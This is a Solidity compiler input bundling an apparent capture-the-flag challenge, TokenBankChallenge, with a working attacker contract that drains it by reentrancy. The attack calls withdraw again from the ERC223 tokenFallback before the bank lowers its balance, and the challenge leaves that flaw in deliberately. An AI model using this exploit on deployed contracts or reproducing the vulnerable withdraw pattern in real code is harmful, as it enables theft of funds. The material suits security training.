{
  "language": "Solidity",
  "sources": {
    "contracts/TokenBank_attack.sol": {
      "content": "pragma solidity ^0.4.21;\nimport \"./TokenBankChallenge.sol\";\n\ncontract callWithdraw {\n    bool stop = false;\n    uint256 counter = 0;\n    TokenBankChallenge CodeToCall;\n\n    function initCodeToCall(address _addr) public {\n        CodeToCall = TokenBankChallenge(address(_addr));\n    }\n\n    function transferToTokenBank(address tokenaddr, address transferTo) public {\n        SimpleERC223Token token = SimpleERC223Token(tokenaddr);\n        // 500,000 * 10**18 = 500000000000000000000000\n        token.transfer(transferTo, 500000000000000000000000);\n    }\n\n    function execute() public {\n        CodeToCall.withdraw(500000000000000000000000);\n    }\n\n    function tokenFallback(\n        address from,\n        uint256 value,\n        bytes a\n    ) public {\n        if (counter == 0 || counter == 2) {\n            counter += 1;\n        } else {\n            counter += 1;\n            CodeToCall.withdraw(500000000000000000000000);\n        }\n    }\n}\n"
    },
    "contracts/TokenBankChallenge.sol": {
      "content": "pragma solidity ^0.4.21;\n\ninterface ITokenReceiver {\n    function tokenFallback(\n        address from,\n        uint256 value,\n        bytes data\n    ) external;\n}\n\ncontract SimpleERC223Token {\n    // Track how many tokens are owned by each address.\n    mapping(address => uint256) public balanceOf;\n\n    string public name = \"Simple ERC223 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    uint256 public totalSupply = 1000000 * (uint256(10)**decimals);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function SimpleERC223Token() public {\n        balanceOf[msg.sender] = totalSupply;\n        emit Transfer(address(0), msg.sender, totalSupply);\n    }\n\n    function isContract(address _addr) private view returns (bool is_contract) {\n        uint256 length;\n        assembly {\n            //retrieve the size of the code on target address, this needs assembly\n            length := extcodesize(_addr)\n        }\n        return length > 0;\n    }\n\n    function transfer(address to, uint256 value) public returns (bool success) {\n        bytes memory empty;\n        return transfer(to, value, empty);\n    }\n\n    function transfer(\n        address to,\n        uint256 value,\n        bytes data\n    ) public returns (bool) {\n        require(balanceOf[msg.sender] >= value);\n\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n        emit Transfer(msg.sender, to, value);\n\n        if (isContract(to)) {\n            ITokenReceiver(to).tokenFallback(msg.sender, value, data);\n        }\n        return true;\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    function approve(address spender, uint256 value)\n        public\n        returns (bool success)\n    {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) public returns (bool success) {\n        require(value <= balanceOf[from]);\n        require(value <= allowance[from][msg.sender]);\n\n        balanceOf[from] -= value;\n        balanceOf[to] += value;\n        allowance[from][msg.sender] -= value;\n        emit Transfer(from, to, value);\n        return true;\n    }\n}\n\ncontract TokenBankChallenge {\n    SimpleERC223Token public token;\n    mapping(address => uint256) public balanceOf;\n\n    function TokenBankChallenge(address player) public {\n        token = new SimpleERC223Token();\n\n        // Divide up the 1,000,000 tokens, which are all initially assigned to\n        // the token contract's creator (this contract).\n        balanceOf[msg.sender] = 500000 * 10**18; // half for me\n        balanceOf[player] = 500000 * 10**18; // half for you\n    }\n\n    function isComplete() public view returns (bool) {\n        return token.balanceOf(this) == 0;\n    }\n\n    function tokenFallback(\n        address from,\n        uint256 value,\n        bytes\n    ) public {\n        require(msg.sender == address(token));\n        require(balanceOf[from] + value >= balanceOf[from]);\n\n        balanceOf[from] += value;\n    }\n\n    function withdraw(uint256 amount) public {\n        require(balanceOf[msg.sender] >= amount);\n\n        require(token.transfer(msg.sender, amount));\n        balanceOf[msg.sender] -= amount;\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}